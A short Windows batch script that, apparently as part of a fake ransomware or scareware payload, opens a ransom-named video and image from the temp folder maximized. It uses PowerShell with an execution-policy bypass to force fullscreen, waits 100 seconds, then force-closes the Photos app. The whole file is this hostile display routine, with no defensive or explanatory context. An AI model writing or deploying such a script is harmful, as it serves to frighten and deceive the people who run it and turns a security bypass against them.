@echo off
timeout /t 1
start /max "" "%temp%\rans.mp4"
timeout /t 1
start /max "" "%temp%\ransd.png"
powershell.exe -ExecutionPolicy Bypass -Command "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.SendKeys]::SendWait('{F11}')"
timeout /t 100
powershell.exe -ExecutionPolicy Bypass -Command "Stop-Process -Name 'PhotosApp' -Force"
